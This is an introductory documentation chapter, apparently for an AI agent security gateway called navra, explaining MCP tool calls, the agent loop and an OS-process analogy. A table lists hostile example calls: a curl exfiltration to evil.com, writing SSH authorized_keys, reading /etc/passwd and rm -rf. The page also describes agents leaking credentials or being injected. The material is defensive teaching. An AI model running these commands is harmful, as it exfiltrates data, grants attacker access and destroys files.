+++
title = "0. What Agents Actually Do"
description = "AI agents are not chatbots — they are tool-calling processes that read files, execute code, and modify systems. Understanding what they do is the first step to understanding why they need security."
weight = 5
template = "docs/page.html"

[extra]
part = "threat"
toc = true
+++

## What you already know

You've used ChatGPT, Claude, or a similar AI assistant. You typed a question, got an answer. Maybe you pasted some code and asked for a fix. The model read your text, generated a response, and that was it. The model didn't *do* anything to your system. It just talked.

That's a chatbot. This chapter is about something different.

## Agents are processes, not conversations

An AI agent is a program that calls tools. It reads files on your disk, executes shell commands, commits code to Git repositories, queries databases, and sends HTTP requests. It does these things in a loop: the model decides what to do next, calls a tool, reads the result, and decides again.

Here is what a single tool call looks like on the wire. This is [MCP](https://modelcontextprotocol.io/) (Model Context Protocol), the standard that connects AI agents to tools:

```json
{
  "jsonrpc": "2.0",
  "id": 42,
  "method": "tools/call",
  "params": {
    "name": "file_read",
    "arguments": {
      "path": "/home/alice/project/src/main.rs"
    }
  }
}
```

The agent asked to read a file. Not "please summarize this file" — it issued a structured command to a server that will open that path and return its contents. The server responds:

```json
{
  "jsonrpc": "2.0",
  "id": 42,
  "result": {
    "content": [
      {
        "type": "text",
        "text": "fn main() {\n    println!(\"Hello, world!\");\n}\n"
      }
    ]
  }
}
```

This is not a conversation. This is a remote procedure call. The agent sent a command, the server executed it, and the agent received the result. The model never saw the file directly — a *program* read the file and handed the content to the model.

## What tools can do

Here are real tool calls that agents make every day. These are not hypothetical — they are things that Claude Code, GitHub Copilot, Cursor, and similar tools do routinely:

| Tool call | What it does | What could go wrong |
|-----------|-------------|-------------------|
| `file_read { path: "/etc/passwd" }` | Reads a system file | Leaks user account information |
| `file_write { path: "~/.ssh/authorized_keys", content: "..." }` | Writes to a file | Grants SSH access to an attacker |
| `git_commit { message: "fix: update deps" }` | Creates a Git commit | Injects malicious code into a repository |
| `exec { command: "curl https://evil.com/exfil?data=..." }` | Runs a shell command | Exfiltrates data to an external server |
| `exec { command: "rm -rf /home/alice/project" }` | Runs a shell command | Deletes a project directory |
| `db_query { sql: "SELECT * FROM users" }` | Queries a database | Dumps all user records |

Every one of these is a legitimate operation in the right context. A coding agent *should* be able to read source files, write code, and run tests. The problem is that the same mechanisms that let it do useful work also let it do harmful work.

## The agent loop

An agent doesn't make one tool call. It runs in a loop. Here's what a typical coding agent session looks like:

```
1. Agent receives task: "Fix the failing test in auth.rs"
2. Agent calls: git_status {}
3. Agent reads result, decides to look at the test file
4. Agent calls: file_read { path: "src/auth.rs" }
5. Agent reads the code, identifies the bug
6. Agent calls: file_write { path: "src/auth.rs", content: "..." }
7. Agent calls: exec { command: "cargo test" }
8. Agent reads test output, sees tests pass
9. Agent calls: git_commit { message: "fix: correct auth token validation" }
10. Agent reports: "Done. The test was failing because..."
```

Steps 2 through 9 happened without human involvement. The model decided what to read, what to change, what to run, and what to commit. A human asked for step 1, and got a report at step 10. Everything in between was autonomous.

This is powerful. It's also the reason security matters.

## The OS process analogy

If you have a Linux or Unix background, you already have the right mental model. An AI agent is a process.

| OS concept | Agent equivalent |
|-----------|-----------------|
| Process | Agent instance running in a loop |
| System call | MCP tool call |
| File descriptor | Tool handle (file path, database connection) |
| User ID | Agent identity (token, name) |
| Permissions | ACLs on which tools the agent can call |
| `fork()` | Leader agent delegating to a specialist |
| IPC | Agents exchanging messages through shared context |

When a process on your system calls `open("/etc/shadow", O_RDONLY)`, the kernel checks whether that process has permission to read that file. The kernel doesn't *ask* the process to be nice. It doesn't *suggest* that `/etc/shadow` is sensitive. It checks a permission bit and returns `EACCES` if the check fails.

When an AI agent calls `file_read { path: "/etc/shadow" }`, what checks the permission? In most current setups: nothing. The MCP server receives the request, opens the file, and returns the contents. The agent asked, and the server complied.

That's the gap this entire Learn section is about.

## Agents are not users

There's a tempting analogy: "the agent is like a user." It has a name, it authenticates, it makes requests. But agents differ from human users in ways that matter for security:

**Speed.** A human might read 5 files in a session. An agent reads 50 in a minute. An agent can exfiltrate an entire codebase before a human notices anything unusual.

**Judgment.** A human sees a file called `secrets.env` and knows not to paste its contents into a public channel. An agent sees text. Whether it treats that text as sensitive depends entirely on its instructions — which, as we'll see in the next chapter, are not a reliable security mechanism.

**Controllability.** You can tell a human "don't read files outside the project directory" and they'll comply. You can tell an agent the same thing, and it will *usually* comply — but "usually" is not a security property.

**Delegation.** In multi-agent systems, a leader agent creates specialist agents and gives them tasks. Each specialist runs its own tool-call loop. The leader might be trustworthy, but can it guarantee the behavior of every agent it spawns? This is the delegation problem, and we'll cover it in [Chapter 3](../multi-agent-surface/).

## A concrete scenario

You're a developer. You install a coding agent that connects to an MCP server with file and git tools. You give it access to your project directory. You ask it to "refactor the database module to use connection pooling."

The agent does its job. It reads the relevant files, understands the code, writes a clean refactoring, runs the tests, and commits the result. Excellent.

But during its work, the agent also read your `.env` file (to understand the database connection string). That file contained your database password, your API keys, and your AWS credentials. The agent now has all of that in its context window. If the agent's model provider logs conversations, those credentials are now on someone else's server. If the agent later gets injected (Chapter 2), those credentials are available to the attacker.

Nothing malicious happened. No one hacked anything. The agent did exactly what a competent developer would do — read the config file to understand the setup. The problem is that "exactly what a competent developer would do" includes reading sensitive data, and unlike a human developer, the agent has no judgment about what to do with it afterward.

## Why this matters for navra

navra sits between the agent and the tools. Every tool call in the examples above — `file_read`, `file_write`, `exec`, `git_commit` — passes through navra before reaching the MCP server that executes it. navra can:

- Check whether the agent is allowed to call that tool
- Check whether the agent is allowed to access that path
- Scan the result for sensitive data before returning it
- Require human approval for destructive operations
- Log everything for audit

This is the same role that a kernel plays for OS processes. The kernel doesn't prevent all misuse — a process with the right permissions can still do damage. But the kernel ensures that permissions are *checked*, that access is *logged*, and that processes can't silently escalate their own privileges.

That's what a security gateway does for AI agents. The rest of this series explains the threats it addresses, the mechanisms it uses, and the limits of what it can achieve.

## What's next

You now know that agents are tool-calling processes, not chatbots. They read files, run commands, and modify systems — autonomously, at speed, without judgment.

But wait — can't you just tell the agent not to read sensitive files? Can't you put "never access .env files" in the system prompt? In [Chapter 1: Why Prompts Aren't Security](../prompts-arent-security/), we'll see why that doesn't work.
